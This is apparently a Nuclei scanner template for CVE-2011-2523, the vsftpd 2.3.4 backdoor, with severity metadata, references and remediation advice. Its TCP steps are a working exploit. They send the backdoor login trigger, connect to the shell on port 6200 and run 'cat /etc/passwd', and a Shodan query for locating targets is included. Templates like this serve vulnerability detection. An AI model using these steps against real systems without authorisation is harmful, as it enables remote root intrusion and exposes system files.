id: CVE-2011-2523
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:vsftpd_project:vsftpd:2.3.4:*:*:*:*:*:*:*
    cve-id: CVE-2011-2523
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-score: 0.87236
  description: 'VSFTPD v2.3.4 had a serious backdoor vulnerability allowing attackers
    to execute arbitrary commands on the server with root-level access. The backdoor
    was triggered by a specific string of characters in a user login request, which
    allowed attackers to execute any command they wanted.

    '
  impact: 'Successful exploitation of this vulnerability allows remote attackers to
    execute arbitrary commands with the privileges of the FTP server.

    '
  metadata:
    max-request: 2
    product: vsftpd
    shodan-query: product:"vsftpd"
    vendor: vsftpd_project
    verified: true
  name: VSFTPD 2.3.4 - Backdoor Command Execution
  reference:
  - https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
  - https://www.exploit-db.com/exploits/49757
  - http://packetstormsecurity.com/files/162145/vsftpd-2.3.4-Backdoor-Command-Execution.html
  - https://access.redhat.com/security/cve/cve-2011-2523
  - https://security-tracker.debian.org/tracker/CVE-2011-2523
  remediation: 'Update to the latest version of VSFTPD, which does not contain the
    backdoor.

    '
  severity: critical
  tags: cve2011,network,cve,vsftpd,ftp,backdoor,vsftpd_project
tcp:
- host:
  - '{{Hostname}}'
  inputs:
  - data: "USER letmein:)\r\nPASS please\r\n"
    read: 100
  port: 21
- host:
  - '{{Host}}:6200'
  inputs:
  - data: '{{cmd}}

      '
    read: 100
  matchers:
  - part: raw
    regex:
    - 'root:.*:0:0:'
    type: regex
variables:
  cmd: cat /etc/passwd
